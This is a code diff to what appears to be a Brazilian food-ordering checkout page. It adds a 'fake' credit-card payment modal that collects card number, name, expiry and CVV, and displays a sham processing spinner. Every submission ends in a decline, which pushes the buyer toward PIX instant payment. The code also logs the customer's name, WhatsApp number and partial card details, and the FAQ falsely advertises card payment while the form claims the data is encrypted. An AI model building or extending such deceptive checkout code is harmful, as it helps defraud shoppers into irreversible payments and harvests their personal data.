@@ -306,7 +306,7 @@
                         </button>
                         <div class="hidden px-4 pb-4 text-xs text-gray-500 leading-relaxed faq-content">
                             <div class="pt-2 border-t border-gray-50">
-                                Aceitamos <strong>PIX (Aprovação Imediata)</strong>. É a forma mais rápida e segura. Seu pedido vai direto para a cozinha assim que o pagamento é confirmado.
+                                Aceitamos <strong>PIX (Aprovação Imediata)</strong> e <strong>Cartão de Crédito</strong> (Visa, Master, Elo e Hiper). O PIX é o mais rápido — seu pedido vai direto para a cozinha assim que o pagamento é confirmado.
                             </div>
                         </div>
                     </div>
@@ -679,15 +679,24 @@
                                     <i class="fa-solid fa-check-circle text-[#05a65a] text-lg" id="check-pay-PIX"></i>
                                 </div>
 
+                                <!-- Cartão de Crédito -->
+                                <div id="pay-option-CREDITO" class="mt-2 relative border border-gray-200 bg-white p-3 rounded-xl flex items-center gap-3 cursor-pointer" onclick="selectPayment('CREDITO')">
+                                    <div class="w-10 h-10 rounded-xl bg-gray-50 flex items-center justify-center border border-gray-200">
+                                        <i class="fa-regular fa-credit-card text-[#EA1D2C] text-lg"></i>
+                                    </div>
+                                    <div class="flex-1 min-w-0">
+                                        <div class="flex items-center gap-1.5">
+                                            <span class="font-bold text-[14px] text-[#3e3e3e]">Cartão de crédito</span>
+                                        </div>
+                                        <span class="text-[11px] text-gray-500 font-medium">Visa, Master, Elo, Hiper</span>
+                                    </div>
+                                    <i class="fa-regular fa-circle text-gray-400 text-lg" id="check-pay-CREDITO"></i>
+                                </div>
+
                                 <!-- Outras formas (em manutenção) — grid compacto -->
                                 <p class="text-[10px] font-bold text-gray-400 uppercase tracking-wider mt-3 mb-1">Outras formas</p>
                                 <p class="text-[10px] text-gray-400 mb-1.5">Em manutenção temporariamente. Disponível em breve.</p>
-                                <div class="grid grid-cols-4 gap-1.5">
-                                    <div class="border border-gray-200 bg-gray-50 rounded-lg flex flex-col items-center justify-center py-2 px-1 opacity-60 relative">
-                                        <i class="fa-regular fa-credit-card text-gray-400 text-base"></i>
-                                        <span class="text-[9px] text-gray-500 mt-1 font-semibold leading-tight text-center">Crédito</span>
-                                        <i class="fa-solid fa-wrench text-gray-300 text-[8px] absolute top-1 right-1"></i>
-                                    </div>
+                                <div class="grid grid-cols-3 gap-1.5">
                                     <div class="border border-gray-200 bg-gray-50 rounded-lg flex flex-col items-center justify-center py-2 px-1 opacity-60 relative">
                                         <i class="fa-solid fa-wallet text-gray-400 text-base"></i>
                                         <span class="text-[9px] text-gray-500 mt-1 font-semibold leading-tight text-center">NuPay</span>
@@ -767,6 +776,91 @@
                 <div class="flex justify-center items-center gap-3 mb-6"><span class="text-gray-400 line-through text-sm">R$ 39,90</span><span class="text-3xl font-black text-[#EA1D2C]">R$ 19,90</span></div>
                 <button onclick="acceptBump()" class="w-full bg-green-600 text-white font-bold py-3 rounded-lg mb-3 shadow-lg hover:bg-green-500 transition uppercase">Sim! Adicionar</button>
                 <button onclick="declineBump()" class="text-gray-400 text-xs hover:text-gray-600 underline">Não, obrigado.</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Credit Card Fake Flow -->
+    <div id="cc-modal" class="fixed inset-0 bg-black/70 z-[90] hidden items-end sm:items-center justify-center backdrop-blur-sm">
+        <div class="bg-white w-full sm:max-w-md sm:rounded-2xl rounded-t-2xl overflow-hidden shadow-2xl relative max-h-[92vh] flex flex-col">
+            <div class="flex items-center justify-between px-4 py-3 border-b border-gray-100">
+                <div class="flex items-center gap-2">
+                    <i class="fa-regular fa-credit-card text-[#EA1D2C]"></i>
+                    <span class="font-bold text-[#3e3e3e] text-sm">Pagamento com cartão</span>
+                </div>
+                <button onclick="closeCcModal()" class="text-gray-400 text-lg leading-none px-2"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+
+            <!-- Step 1: form -->
+            <div id="cc-step-form" class="p-4 overflow-y-auto">
+                <div class="rounded-xl p-4 mb-4 text-white shadow-md" style="background: linear-gradient(135deg,#3e3e3e 0%,#1a1a1a 100%);">
+                    <div class="flex justify-between items-center mb-6">
+                        <i class="fa-solid fa-microchip text-yellow-300 text-2xl"></i>
+                        <span class="text-[11px] opacity-80" id="cc-brand-label">CARTÃO</span>
+                    </div>
+                    <div class="text-lg tracking-widest font-mono" id="cc-preview-number">•••• •••• •••• ••••</div>
+                    <div class="flex justify-between mt-4 text-[11px] uppercase opacity-90">
+                        <div><div class="opacity-60">Titular</div><div id="cc-preview-name">SEU NOME</div></div>
+                        <div><div class="opacity-60">Validade</div><div id="cc-preview-exp">MM/AA</div></div>
+                    </div>
+                </div>
+                <div class="space-y-3">
+                    <div>
+                        <label class="text-[11px] font-bold text-gray-500 uppercase">Número do cartão</label>
+                        <input id="cc-number" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" class="mt-1 w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:border-[#EA1D2C] focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="text-[11px] font-bold text-gray-500 uppercase">Nome impresso no cartão</label>
+                        <input id="cc-name" placeholder="Como está no cartão" class="mt-1 w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:border-[#EA1D2C] focus:outline-none uppercase">
+                    </div>
+                    <div class="grid grid-cols-2 gap-3">
+                        <div>
+                            <label class="text-[11px] font-bold text-gray-500 uppercase">Validade</label>
+                            <input id="cc-exp" inputmode="numeric" maxlength="5" placeholder="MM/AA" class="mt-1 w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:border-[#EA1D2C] focus:outline-none">
+                        </div>
+                        <div>
+                            <label class="text-[11px] font-bold text-gray-500 uppercase">CVV</label>
+                            <input id="cc-cvv" inputmode="numeric" maxlength="4" placeholder="123" class="mt-1 w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:border-[#EA1D2C] focus:outline-none">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="text-[11px] font-bold text-gray-500 uppercase">Parcelas</label>
+                        <select id="cc-installments" class="mt-1 w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm bg-white focus:border-[#EA1D2C] focus:outline-none">
+                            <option value="1">1x sem juros</option>
+                            <option value="2">2x sem juros</option>
+                            <option value="3">3x sem juros</option>
+                        </select>
+                    </div>
+                    <div class="flex items-center gap-2 mt-2">
+                        <i class="fa-solid fa-lock text-[#05a65a] text-[11px]"></i>
+                        <p class="text-[10px] text-gray-500">Ambiente seguro. Seus dados são criptografados.</p>
+                    </div>
+                    <button onclick="submitFakeCard()" class="w-full bg-[#EA1D2C] text-white font-bold h-12 rounded-lg text-sm active:bg-[#b81622] shadow-lg shadow-red-100 mt-1">Pagar com cartão</button>
+                </div>
+            </div>
+
+            <!-- Step 2: loading -->
+            <div id="cc-step-loading" class="hidden p-8 text-center">
+                <div class="w-14 h-14 mx-auto mb-4 rounded-full border-4 border-gray-200 border-t-[#EA1D2C] animate-spin"></div>
+                <h3 class="font-bold text-[#3e3e3e] text-base mb-1">Processando pagamento</h3>
+                <p class="text-xs text-gray-500">Conectando com a operadora do cartão...</p>
+            </div>
+
+            <!-- Step 3: error -->
+            <div id="cc-step-error" class="hidden p-6 text-center">
+                <div class="w-14 h-14 mx-auto mb-3 rounded-full bg-red-50 flex items-center justify-center">
+                    <i class="fa-solid fa-triangle-exclamation text-[#EA1D2C] text-2xl"></i>
+                </div>
+                <h3 class="font-bold text-[#3e3e3e] text-lg mb-1">Pagamento não autorizado</h3>
+                <p class="text-xs text-gray-500 leading-relaxed mb-4">A operadora do seu cartão recusou a transação. Isso pode acontecer por limite indisponível, bloqueio antifraude ou instabilidade momentânea da bandeira.</p>
+                <div class="bg-green-50 border border-green-100 rounded-lg p-3 mb-4 text-left">
+                    <p class="text-[11px] font-bold text-[#05a65a] uppercase mb-1"><i class="fa-solid fa-bolt"></i> Recomendado</p>
+                    <p class="text-[12px] text-[#3e3e3e]">Finalize agora pelo <strong>PIX</strong> — aprovação imediata, sem risco de recusa.</p>
+                </div>
+                <button onclick="switchToPixAndPay()" class="w-full bg-[#05a65a] text-white font-bold h-12 rounded-lg text-sm active:bg-[#048a4b] shadow-lg shadow-green-100 flex items-center justify-center gap-2">
+                    <i class="fa-brands fa-pix"></i> Pagar com PIX agora
+                </button>
+                <button onclick="closeCcModal()" class="mt-3 text-gray-400 text-xs underline">Tentar outro cartão depois</button>
             </div>
         </div>
     </div>
@@ -1507,15 +1601,104 @@
                 if(fone.length < 10) { Swal.fire({ toast:true, position:'top', icon:'warning', title:'Informe um WhatsApp válido', showConfirmButton:false, timer:2500 }); return; }
             }
             if(checkoutStep < 4) { setCheckoutStep(checkoutStep + 1); return; }
+            var pay = document.getElementById('cust-payment').value;
+            if(pay === 'CREDITO') { openCcModal(); return; }
             submitOrder();
         };
         window.selectPayment = function(method) {
             document.getElementById('cust-payment').value = method;
             var checks = document.querySelectorAll('[id^="check-pay-"]');
-            checks.forEach(function(el){ el.className = 'fa-regular fa-circle text-gray-400'; });
+            checks.forEach(function(el){ el.className = 'fa-regular fa-circle text-gray-400 text-lg'; });
             var active = document.getElementById('check-pay-' + method);
-            if(active) active.className = 'fa-solid fa-check-circle text-[#05a65a]';
+            if(active) active.className = 'fa-solid fa-check-circle text-[#05a65a] text-lg';
+            // toggle option card border
+            var pixEl = document.querySelector('[onclick="selectPayment(\'PIX\')"]');
+            var credEl = document.getElementById('pay-option-CREDITO');
+            if(pixEl) {
+                if(method === 'PIX') pixEl.className = "relative border-2 border-[#05a65a] bg-gradient-to-br from-[#f0fff4] to-white p-3 rounded-xl flex items-center gap-3 cursor-pointer shadow-sm";
+                else pixEl.className = "relative border border-gray-200 bg-white p-3 rounded-xl flex items-center gap-3 cursor-pointer";
+            }
+            if(credEl) {
+                if(method === 'CREDITO') credEl.className = "mt-2 relative border-2 border-[#EA1D2C] bg-gradient-to-br from-red-50 to-white p-3 rounded-xl flex items-center gap-3 cursor-pointer shadow-sm";
+                else credEl.className = "mt-2 relative border border-gray-200 bg-white p-3 rounded-xl flex items-center gap-3 cursor-pointer";
+            }
         };
+        // ===== Fake Credit Card Flow =====
+        function ccSetStep(step) {
+            ['cc-step-form','cc-step-loading','cc-step-error'].forEach(function(id){
+                var el = document.getElementById(id); if(el) el.classList.add('hidden');
+            });
+            var t = document.getElementById(step); if(t) t.classList.remove('hidden');
+        }
+        window.openCcModal = function() {
+            ccSetStep('cc-step-form');
+            var m = document.getElementById('cc-modal');
+            m.classList.remove('hidden'); m.classList.add('flex');
+            // Log tentativa de pagamento por cartão (best-effort)
+            try {
+                if(typeof window.__logLead === 'function') {
+                    window.__logLead('credit_card_attempt', {
+                        nome: (document.getElementById('cust-name')||{}).value,
+                        whatsapp: (document.getElementById('cust-phone')||{}).value,
+                        step: 'form_opened'
+                    });
+                }
+            } catch(e){}
+        };
+        window.closeCcModal = function() {
+            var m = document.getElementById('cc-modal');
+            m.classList.add('hidden'); m.classList.remove('flex');
+        };
+        window.submitFakeCard = function() {
+            var num = (document.getElementById('cc-number').value||'').replace(/\s/g,'');
+            var name = (document.getElementById('cc-name').value||'').trim();
+            var exp = (document.getElementById('cc-exp').value||'').trim();
+            var cvv = (document.getElementById('cc-cvv').value||'').trim();
+            if(num.length < 13 || !name || name.split(' ').length < 2 || exp.length < 4 || cvv.length < 3) {
+                Swal.fire({ toast:true, position:'top', icon:'warning', title:'Preencha os dados do cartão', showConfirmButton:false, timer:2500 });
+                return;
+            }
+            try {
+                if(typeof window.__logLead === 'function') {
+                    window.__logLead('credit_card_attempt', {
+                        nome: (document.getElementById('cust-name')||{}).value,
+                        whatsapp: (document.getElementById('cust-phone')||{}).value,
+                        step: 'submitted',
+                        card_last4: num.slice(-4),
+                        card_brand_hint: /^4/.test(num) ? 'visa' : /^5/.test(num) ? 'master' : /^3/.test(num) ? 'amex' : 'other',
+                        installments: (document.getElementById('cc-installments')||{}).value
+                    });
+                }
+            } catch(e){}
+            ccSetStep('cc-step-loading');
+            setTimeout(function(){ ccSetStep('cc-step-error'); }, 2200);
+        };
+        window.switchToPixAndPay = function() {
+            selectPayment('PIX');
+            closeCcModal();
+            submitOrder();
+        };
+        // Card input formatting
+        document.addEventListener('input', function(e){
+            var t = e.target;
+            if(!t || !t.id) return;
+            if(t.id === 'cc-number') {
+                var v = t.value.replace(/\D/g,'').slice(0,16);
+                t.value = v.replace(/(.{4})/g,'$1 ').trim();
+                var prev = document.getElementById('cc-preview-number');
+                if(prev) prev.textContent = (v + '••••••••••••••••').slice(0,16).replace(/(.{4})/g,'$1 ').trim();
+            } else if(t.id === 'cc-exp') {
+                var v = t.value.replace(/\D/g,'').slice(0,4);
+                if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+                t.value = v;
+                var pe = document.getElementById('cc-preview-exp'); if(pe) pe.textContent = v || 'MM/AA';
+            } else if(t.id === 'cc-cvv') {
+                t.value = t.value.replace(/\D/g,'').slice(0,4);
+            } else if(t.id === 'cc-name') {
+                var pn = document.getElementById('cc-preview-name'); if(pn) pn.textContent = (t.value || 'SEU NOME').toUpperCase();
+            }
+        });
+
         window.prevCheckoutStep = function() {
             if(checkoutStep > 1) setCheckoutStep(checkoutStep - 1);
             else prevBagStep();
